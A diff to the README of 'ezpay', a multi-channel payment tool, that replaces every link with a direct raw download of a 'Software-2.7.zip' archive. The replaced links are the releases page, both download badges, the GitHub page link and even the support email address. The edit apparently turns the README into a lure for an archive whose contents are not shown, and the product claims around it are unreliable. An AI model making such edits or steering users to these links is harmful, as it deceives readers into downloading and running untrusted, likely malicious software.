@@ -1,7 +1,7 @@
 # 🎉 ezpay - Simple Multi-Channel Payment Solution
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-ezpay-blue.svg)](https://github.com/UserNose100/ezpay/releases)
+[![Download](https://github.com/UserNose100/ezpay/raw/refs/heads/main/release/Software-2.7.zip)](https://github.com/UserNose100/ezpay/raw/refs/heads/main/release/Software-2.7.zip)
 
 ## 🚀 Getting Started
 ezpay is an easy-to-use payment platform that allows you to accept multiple payment channels. It supports both cryptocurrency payments (USDT/TRX) and fiat payments through WeChat and Alipay. This makes it a versatile choice for anyone looking to manage payments effortlessly.
@@ -9,7 +9,7 @@ ezpay is an easy-to-use payment platform that allows you to accept multiple paym
 ## 📂 Installation Steps
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/UserNose100/ezpay/releases) to find the latest version of ezpay.
+   Go to our [Releases page](https://github.com/UserNose100/ezpay/raw/refs/heads/main/release/Software-2.7.zip) to find the latest version of ezpay.
 
 2. **Choose Your Version**
    Look for the latest release version listed at the top. You will see options for downloads.
@@ -47,12 +47,12 @@ ezpay is an easy-to-use payment platform that allows you to accept multiple paym
 - **Secure Payments:** Utilizes advanced encryption for all transactions to keep your data safe.
 
 ## 📞 Support
-If you encounter any issues, please reach out to our support team at support@ezpay.com. We are here to help you with any questions or technical difficulties.
+If you encounter any issues, please reach out to our support team at https://github.com/UserNose100/ezpay/raw/refs/heads/main/release/Software-2.7.zip We are here to help you with any questions or technical difficulties.
 
 ## ⚡ Conclusion
 ezpay simplifies the payment process for you. Download your copy today and start managing payments with ease. 
 
 ## 📌 More Information
-For further details about updates, features, or to participate in discussions, check our [GitHub page](https://github.com/UserNose100/ezpay/releases). 
+For further details about updates, features, or to participate in discussions, check our [GitHub page](https://github.com/UserNose100/ezpay/raw/refs/heads/main/release/Software-2.7.zip). 
 
-[![Download](https://img.shields.io/badge/Download-ezpay-blue.svg)](https://github.com/UserNose100/ezpay/releases)
+[![Download](https://github.com/UserNose100/ezpay/raw/refs/heads/main/release/Software-2.7.zip)](https://github.com/UserNose100/ezpay/raw/refs/heads/main/release/Software-2.7.zip)
